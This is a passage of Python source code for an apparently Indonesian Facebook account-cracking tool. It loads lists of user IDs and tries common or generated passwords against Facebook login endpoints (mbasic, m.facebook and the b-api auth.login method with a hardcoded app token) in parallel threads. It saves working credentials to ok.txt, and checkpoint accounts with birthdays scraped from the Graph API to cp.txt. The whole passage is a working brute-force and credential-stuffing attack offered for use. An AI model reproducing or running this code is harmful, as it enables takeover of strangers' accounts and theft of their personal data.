					while True:
						try:
							self.apk=input(o+"["+p+"•"+o+"]"+p+" List ID : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+p+"•"+o+"]"+p+" Mulai Crack.... "+o+"\n["+p+"•"+o+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+p+"•"+o+"]"+p+" Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((o+"\n["+p+"•"+o+"]"+p+" Mulai Crack.... "+o+"\n["+p+"•"+o+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r\x1b[0;36m[\x1b[0;37mOK\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;36m[\x1b[0;37mCP\x1b[0;36m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackmfb:
	os.system("clear")
	banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+p+"•"+o+"]"+p+" Crack Dengan Password Default/Manual [d/m]"))
		while True:
			f=input(o+"["+p+"•"+o+"]"+p+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=input(k+"["+p+"•"+k+"]"+p+" List ID : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=input(k+"["+p+"•"+k+"]"+p+" List ID : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Mulai Crack.... "+k+"\n["+p+"•"+k+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Mulai Crack.... "+k+"\n["+p+"•"+k+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print(("\r\x1b[0;36m[\x1b[0;37mOK\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r\x1b[0;36m[\x1b[0;37mCP\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.puko()
  def puko(self):
    print((k+"\n["+p+"•"+k+"]"+p+" Crack Dengan Password Default/Manual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Nomor salah"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" List ID : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Mulai Crack.... "+k+"\n["+p+"•"+k+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" List ID : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Mulai Crack.... "+k+"\n["+p+"•"+k+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.puko()
  def puko(self):
    print((k+"\n["+p+"•"+k+"]"+p+" Crack Dengan Password Default/Manual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Nomor salah"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" List ID : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Mulai Crack.... "+k+"\n["+p+"•"+k+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" List ID : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Mulai Crack.... "+k+"\n["+p+"•"+k+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;36m[\x1b[0;37mOK\x1b[0;36m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print(("\r\x1b[0;36m[\x1b[0;37mCP\x1b[0;36m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### RESULT ###

def results(Dekusec,Ngntd):
        if len(Dekusec) !=0:
                print(("[OK] : "+str(len(Dekusec))))
        if len(Ngntd) !=0:
                print(("[CP] : "+str(len(Ngntd))))
        if len(Dekusec) ==0 and len(Ngntd) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" Tidak ada hasil"))

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Hasil Crack"+k+" ]"+p))
    print((k+"\n[ "+p+"OK"+k+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" Tidak ada hasil"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" Tidak ada hasil"))
    input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
    menu()

def updatesc():
	os.system("clear")
	banner()
	print((k+"\n["+p+"•"+k+"]"+p+" Perbarui Script"))
	os.system("git pull origin master")
	print((k+"\n["+p+"•"+k+"]"+p+" Sukses Diperbarui"))
	exit()

def wangsaff():
    os.system("clear")
    banner()
    input("\n Contact DekuSec? ")
    jalan(k+"["+p+"•"+k+"]"+p+" Buka Whatsapp...")
    os.system("xdg-open https://wa.me/+6282273839066?text=*P*")
    input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
    menu()

if __name__=="__main__":
	menu()